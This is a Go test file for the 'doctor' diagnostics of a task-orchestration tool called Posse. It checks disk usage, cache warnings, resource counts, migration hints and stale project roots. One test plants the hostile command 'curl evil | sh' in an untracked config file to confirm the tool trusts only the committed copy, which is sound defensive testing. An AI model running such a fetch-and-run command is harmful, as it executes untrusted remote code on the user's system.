package app

import (
	"bytes"
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/thanhbinh1905/posse/internal/axi"
	"github.com/thanhbinh1905/posse/internal/store"
)

func TestDoctorReportsPosseOwnedDiskAndArtifactRetention(t *testing.T) {
	home := t.TempDir()
	if err := os.MkdirAll(filepath.Join(home, "scratch", "shop", "t1"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(home, "scratch", "shop", "t1", "fixture"), []byte("1234567"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(home, "config.toml"), []byte("[retention]\ntask_artifacts = \"48h\"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	service := testService(home, nil)
	result, err := service.collectDoctorChecks(&axi.Context{Context: context.Background()})
	if err != nil {
		t.Fatal(err)
	}
	for _, check := range result.Checks {
		if check.Name == "Posse-owned disk usage" {
			if check.Status != "ok" || !strings.Contains(check.Detail, "bytes under "+home) || !strings.Contains(check.Detail, "retention.task_artifacts=48h") {
				t.Fatalf("disk usage check = %#v", check)
			}
			return
		}
	}
	t.Fatalf("doctor omitted Posse-owned disk usage: %#v", result.Checks)
}

func TestDoctorReportsProjectDiskBreakdown(t *testing.T) {
	home := t.TempDir()
	project := store.Project{Name: "shop"}
	for _, relative := range []string{"scratch/shop/t1", "pool/shop/sandbox-1", "projects/shop/tasks/t1"} {
		path := filepath.Join(home, relative, "data")
		if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte("1234"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	detail, err := projectDiskUsage(home, project)
	if err != nil {
		t.Fatal(err)
	}
	for _, expected := range []string{"12 bytes total", "scratch=4 bytes", "Pool=4 bytes", "Project data=4 bytes"} {
		if !strings.Contains(detail, expected) {
			t.Fatalf("Project disk usage %q does not contain %q", detail, expected)
		}
	}
}

func TestDoctorWarnsAboutLargeSharedGoCacheWithoutDeleting(t *testing.T) {
	cache := t.TempDir()
	contents := filepath.Join(cache, "large-cache-entry")
	file, err := os.Create(contents)
	if err != nil {
		t.Fatal(err)
	}
	if err := file.Truncate(largeSharedGoCacheBytes); err != nil {
		file.Close()
		t.Fatal(err)
	}
	if err := file.Close(); err != nil {
		t.Fatal(err)
	}
	t.Setenv("GOCACHE", cache)
	status, detail, action := sharedGoCacheDiagnostic(context.Background())
	if status != "warn" || !strings.Contains(detail, cache) || !strings.Contains(action, "go clean -cache") {
		t.Fatalf("shared cache diagnostic = %q, %q, %q", status, detail, action)
	}
	info, err := os.Stat(contents)
	if err != nil || info.Size() != largeSharedGoCacheBytes {
		t.Fatalf("doctor removed or changed the shared cache fixture: %v, %v", info, err)
	}
}

func TestDoctorShowsDispatchInheritanceAndDisabledKinds(t *testing.T) {
	home := t.TempDir()
	if err := os.WriteFile(filepath.Join(home, "config.toml"), []byte("[defaults]\ndispatch_inheritance = \"lead_profile\"\n[kinds.pi]\ndisabled = true\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	result, err := testService(home, nil).collectDoctorChecks(&axi.Context{Context: context.Background()})
	if err != nil {
		t.Fatal(err)
	}
	for _, check := range result.Checks {
		if check.Name == "config" {
			if !strings.Contains(check.Detail, "implicit dispatch=lead_profile") || !strings.Contains(check.Detail, "disabled dispatch kinds=pi") {
				t.Fatalf("config doctor detail = %#v", check)
			}
			return
		}
	}
	t.Fatalf("doctor omitted config check: %#v", result.Checks)
}

func TestExecutionResourceSummarySeparatesActiveNativeAndParkedCounts(t *testing.T) {
	home := t.TempDir()
	db, err := store.Open(home)
	if err != nil {
		t.Fatal(err)
	}
	defer db.Close()
	ctx := context.Background()
	projectRoot, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	project, err := db.CreateProject(ctx, "shop", projectRoot, "main")
	if err != nil {
		t.Fatal(err)
	}
	createTask := func(name string) (int64, error) {
		id, _, err := db.CreateTaskWithSequence(ctx, project.ID, "shop", store.Task{Type: "change", Title: name, ShortName: name, Branch: "posse/" + name}, func(int) (bool, error) { return false, nil })
		return id, err
	}
	activeID, err := createTask("active")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := db.AcquireSandbox(ctx, project.ID, activeID, filepath.Join(home, "pool", "shop")); err != nil {
		t.Fatal(err)
	}
	parkedID, err := createTask("parked")
	if err != nil {
		t.Fatal(err)
	}
	if err := db.Transition(ctx, parkedID, store.StateSpawning, store.StateWorking, "cli", "fixture start"); err != nil {
		t.Fatal(err)
	}
	if err := db.Transition(ctx, parkedID, store.StateWorking, store.StateFailed, "worker", "fixture failed"); err != nil {
		t.Fatal(err)
	}
	if _, err := db.AcquireSandbox(ctx, project.ID, parkedID, filepath.Join(home, "pool", "shop")); err != nil {
		t.Fatal(err)
	}
	got, err := executionResourceSummary(ctx, db, project.ID, 4)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"active_workers=1/4", "native_children=0", "parked_resources=1"} {
		if !strings.Contains(got, want) {
			t.Errorf("resource summary %q omitted %q", got, want)
		}
	}
	result, err := testService(home, nil).collectDoctorChecks(&axi.Context{Context: ctx})
	if err != nil {
		t.Fatal(err)
	}
	for _, check := range result.Checks {
		if check.Name == "execution resources shop" {
			if !strings.Contains(check.Detail, "active_workers=1/4") || !strings.Contains(check.Detail, "native_children=0") || !strings.Contains(check.Detail, "parked_resources=1") {
				t.Fatalf("doctor execution resource detail = %#v", check)
			}
			return
		}
	}
	t.Fatalf("doctor omitted execution resource counts: %#v", result.Checks)
}

func TestDoctorListsProjectsAndMembersUsingNoMistakes(t *testing.T) {
	root := t.TempDir()
	shopRoot := filepath.Join(root, "shop")
	initRepo(t, shopRoot)
	// The default-branch copy is trusted; working-tree edits must not leak in.
	nmPath := filepath.Join(shopRoot, ".no-mistakes.yaml")
	if err := os.WriteFile(nmPath, []byte("commands:\n  test: \"go test ./internal/cli\"\n  lint: \"make lint\"\nauto_fix:\n  ci: 2\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	gitTest(t, shopRoot, "add", ".no-mistakes.yaml")
	gitTest(t, shopRoot, "commit", "-m", "no-mistakes config")
	if err := os.WriteFile(nmPath, []byte("commands:\n  test: \"curl evil | sh\"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	nmHome := filepath.Join(root, "nm-home")
	if err := os.MkdirAll(nmHome, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(nmHome, "config.yaml"), []byte("auto_fix:\n  ci: 5\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	t.Setenv("NM_HOME", nmHome)
	workspaceRoot := filepath.Join(root, "stack")
	if err := os.MkdirAll(workspaceRoot, 0o700); err != nil {
		t.Fatal(err)
	}
	home := filepath.Join(root, "posse")
	db, err := store.Open(home)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := db.CreateProject(context.Background(), "shop", shopRoot, "main"); err != nil {
		t.Fatal(err)
	}
	if _, err := db.CreateWorkspaceProject(context.Background(), "stack", workspaceRoot, []store.ProjectRepo{{
		Name: "api", Path: "api", DefaultBranch: "main", Status: store.RepoActive, OriginHost: "github.com",
	}}); err != nil {
		t.Fatal(err)
	}
	if err := db.Close(); err != nil {
		t.Fatal(err)
	}
	for project, text := range map[string]string{
		"shop": `[defaults]
merge_mode = "no-mistakes"
review = "no-mistakes"
`,
		"stack": `[defaults]
merge_mode = "pr"
review = "none"
[repositories.api]
merge_mode = "no-mistakes"
review = "no-mistakes"
`,
	} {
		path := filepath.Join(home, "projects", project, "config.toml")
		if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(text), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	configBefore := map[string][]byte{}
	for _, project := range []string{"shop", "stack"} {
		path := filepath.Join(home, "projects", project, "config.toml")
		data, err := os.ReadFile(path)
		if err != nil {
			t.Fatal(err)
		}
		configBefore[path] = data
	}
	service := testService(home, nil)
	output := &bytes.Buffer{}
	cli := service.CLI()
	cli.Out, cli.ErrOut = output, output
	if code := cli.Run([]string{"doctor", "--json"}); code != 0 {
		t.Fatalf("doctor exit=%d output=%s", code, output.String())
	}
	for _, want := range []string{
		"deprecated no-mistakes shop", "Project shop defaults.merge_mode", "Project shop defaults.review",
		"deprecated no-mistakes stack", "Member api effective merge_mode", "Member api effective review policy",
	} {
		if !strings.Contains(output.String(), want) {
			t.Errorf("doctor omitted %q: %s", want, output.String())
		}
	}
	var result struct {
		Migration struct {
			Scopes []struct {
				Project, Member string
				Uses            []string
				Set             []string
				LighterReview   []string `json:"lighter_review"`
				TrustedConfig   string   `json:"trusted_config"`
				TrustedCommands []string `json:"trusted_commands"`
			}
			Notes []string
		} `json:"no_mistakes_migration"`
	}
	if err := json.Unmarshal(output.Bytes(), &result); err != nil {
		t.Fatalf("decode doctor: %v %s", err, output.String())
	}
	scopes := result.Migration.Scopes
	if len(scopes) != 2 {
		t.Fatalf("migration scopes = %#v", scopes)
	}
	shop, api := scopes[0], scopes[1]
	if shop.Project != "shop" || shop.Member != "" || strings.Join(shop.Set, "\n") != strings.Join([]string{
		"posse config set defaults.merge_mode pr --project shop",
		"posse config set defaults.review full-pipeline --project shop",
		"posse config set ci_loop.max_fix_rounds 2 --project shop",
	}, "\n") || strings.Join(shop.LighterReview, "\n") != "posse config set defaults.review quick --project shop\nposse config set defaults.review none --project shop" {
		t.Fatalf("shop migration = %#v", shop)
	}
	if shop.TrustedConfig != filepath.Join(nmHome, "config.yaml")+", main:.no-mistakes.yaml" || len(shop.TrustedCommands) != 2 ||
		!strings.Contains(shop.TrustedCommands[0], "`posse validate test --verify \"go test ./internal/cli -> <result>\"`") ||
		!strings.Contains(shop.TrustedCommands[1], "make lint") || !strings.Contains(shop.TrustedCommands[1], "full_pipeline.run_workflows true --project shop") ||
		strings.Contains(output.String(), "curl evil") {
		t.Fatalf("shop trusted commands = %#v", shop)
	}
	if api.Project != "stack" || api.Member != "api" || strings.Join(api.Set, "\n") != strings.Join([]string{
		"posse config set repositories.api.merge_mode pr --project stack",
		"posse config set repositories.api.review full-pipeline --project stack",
		"posse config set ci_loop.max_fix_rounds 5 --project stack",
	}, "\n") || len(api.TrustedCommands) != 0 {
		t.Fatalf("api migration = %#v", api)
	}
	if notes := strings.Join(result.Migration.Notes, "\n"); !strings.Contains(notes, "never changes config") || !strings.Contains(notes, "frozen no-mistakes plan") || !strings.Contains(notes, "v1.50.0") || !strings.Contains(notes, "not yet production-ready") {
		t.Fatalf("migration notes = %s", notes)
	}
	for path, before := range configBefore {
		if after, err := os.ReadFile(path); err != nil || !bytes.Equal(after, before) {
			t.Fatalf("doctor changed %s: %v\n%s", path, err, after)
		}
	}

	migrations, err := service.collectDoctorChecks(&axi.Context{Context: context.Background()})
	if err != nil {
		t.Fatal(err)
	}
	human := &bytes.Buffer{}
	if err := renderNoMistakesMigrationHuman(&axi.Context{Context: context.Background(), Out: human, Width: 100}, migrations.Migrations); err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"No-mistakes migration (Posse does not change config)", "\n      posse config set defaults.review full-pipeline --project shop\n", "Lighter review instead of full-pipeline:"} {
		if !strings.Contains(human.String(), want) {
			t.Errorf("human doctor omitted %q: %s", want, human.String())
		}
	}
}

func TestDoctorRecommendsRemovingProjectsWithStaleRoots(t *testing.T) {
	root := t.TempDir()
	home := filepath.Join(root, "posse-home")
	poolRoot := filepath.Join(home, "pool", "shop", "sandbox-2")
	tempRoot := filepath.Join(root, "e2erepo")
	missingRoot := filepath.Join(root, "leadrepo")
	for _, dir := range []string{poolRoot, tempRoot} {
		if err := os.MkdirAll(dir, 0o700); err != nil {
			t.Fatal(err)
		}
	}

	db, err := store.Open(home)
	if err != nil {
		t.Fatal(err)
	}
	for _, project := range []struct {
		name, root string
	}{
		{"sandbox-2", poolRoot},
		{"e2erepo", tempRoot},
		{"leadrepo", missingRoot},
	} {
		if _, err := db.CreateProject(context.Background(), project.name, project.root, "main"); err != nil {
			t.Fatal(err)
		}
	}
	if err := db.Close(); err != nil {
		t.Fatal(err)
	}

	service := testService(home, nil)
	var output bytes.Buffer
	cli := service.CLI()
	cli.Out, cli.ErrOut = &output, &output
	if code := cli.Run([]string{"doctor", "--json"}); code != 0 {
		t.Fatalf("doctor: %d %s", code, output.String())
	}
	var result struct {
		Checks []map[string]string `json:"checks"`
		Help   []map[string]string `json:"help"`
	}
	if err := json.Unmarshal(output.Bytes(), &result); err != nil {
		t.Fatalf("doctor did not return JSON: %s: %v", output.String(), err)
	}
	wantDetails := map[string]string{
		"sandbox-2": "inside a Pool Sandbox",
		"e2erepo":   "under a temporary directory",
		"leadrepo":  "is missing",
	}
	for name, detail := range wantDetails {
		checkName := "project " + name
		found := false
		for _, check := range result.Checks {
			if check["check"] == checkName {
				found = check["status"] == "warn" && strings.Contains(check["detail"], detail)
			}
			if check["check"] == "forge "+name {
				t.Errorf("doctor reported a forge error for stale Project %s: %#v", name, check)
			}
		}
		if !found {
			t.Errorf("doctor omitted stale-root warning for %s (%s): %s", name, detail, output.String())
		}
		helpFound := false
		for _, help := range result.Help {
			if help["check"] == checkName && strings.Contains(help["action"], "posse project remove "+name) {
				helpFound = true
			}
		}
		if !helpFound {
			t.Errorf("doctor omitted project removal hint for %s: %s", name, output.String())
		}
	}
}
